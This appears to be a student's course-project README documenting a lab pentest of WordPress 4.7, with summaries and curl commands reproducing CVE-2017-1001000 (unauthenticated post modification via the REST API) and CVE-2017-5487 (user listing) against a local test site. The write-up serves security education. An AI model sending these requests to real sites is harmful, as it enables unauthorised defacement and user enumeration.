# Project 7 - WordPress Pentesting

Time spent: **5** hours spent in total

> Objective: Find, analyze, recreate, and document **five vulnerabilities** affecting an old version of WordPress

## Pentesting Report

1. CVE-2017-1001000
  - [x] Summary: The register_routes function in wp-includes/rest-api/endpoints/class-wp-rest-posts-controller.php in the REST API in WordPress 4.7.x before 4.7.2 does not require an integer identifier, which allows remote attackers to modify arbitrary pages via a request for wp-json/wp/v2/posts followed by a numeric value and a non-numeric value, as demonstrated by the wp-json/wp/v2/posts/123?id=123helloworld URI.	
    - Vulnerability types: Privalige escalation
    - Tested in version: 4.7
    - Fixed in version: 4.7.2
  - [x] GIF Walkthrough: ![](https://imgur.com/a/GsrEu)
  - [x] Steps to recreate: Privilage Escalation.  Using the REST api, a URL post request can bypass the authentcation check and allow a non-authenticated user to make changes to a post.

        Valid request:  curl -X POST http://wpdistillery.dev/wp-json/wp/v2/posts/123?id=5 -d '{"content":"hcked content"}'
        Expected output: Status 401

        Invalid request: curl -X POST http://wpdistillery.dev/wp-json/wp/v2/posts/123?id=5abc -d '{"content":"hcked content"}'
        By adding the string 'abc" to the end of the post id(5) and reqesting a post which doesnt exist(123), I now have access to change content.
  - [x] Affected source code: https://github.com/WordPress/WordPress/commit/e357195ce303017d517aff944644a7a1232926f7
    -[Link 1]https://www.cvedetails.com/cve/CVE-2017-1001000/ 
    
2.  CVE-2017-5487
  - [x] Summary:  wp-includes/rest-api/endpoints/class-wp-rest-users-controller.php in the REST API implementation in WordPress 4.7 before 4.7.1 does not properly restrict listings of post authors, which allows remote attackers to obtain sensitive information via a wp-json/wp/v2/users request.	
    - Vulnerability types: Obtain Information
    - Tested in version: 4.7
    - Fixed in version: 4.7.1
  - [x] GIF Walkthrough: ![]https://imgur.com/a/BubW1)
  - [x] Steps to recreate: curl -X GET http://wpdistillery.dev/wp-json/wp/v2/users
  - [x] Affected source code: https://github.com/WordPress/WordPress/commit/daf358983cc1ce0c77bf6d2de2ebbb43df2add60
    - [Link 1](https://www.cvedetails.com/cve/CVE-2017-5487/)
    
    
## Assets

## Resources

- [CVE Details](https://www.cvedetails.com/)
- [WordPress Source Browser](https://core.trac.wordpress.org/browser/)
- [WordPress Developer Reference](https://developer.wordpress.org/reference/)

GIFs created with [LiceCap](http://www.cockos.com/licecap/).
GIFs hosted on imgur.com

## Notes

Finding a suitable version of wordpress was a small challange.  My biggest change was time restraints with other classes.  Due to these, I was unable to find and execute a third exploit. 

## License

    Copyright [yyyy] [name of copyright owner]

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
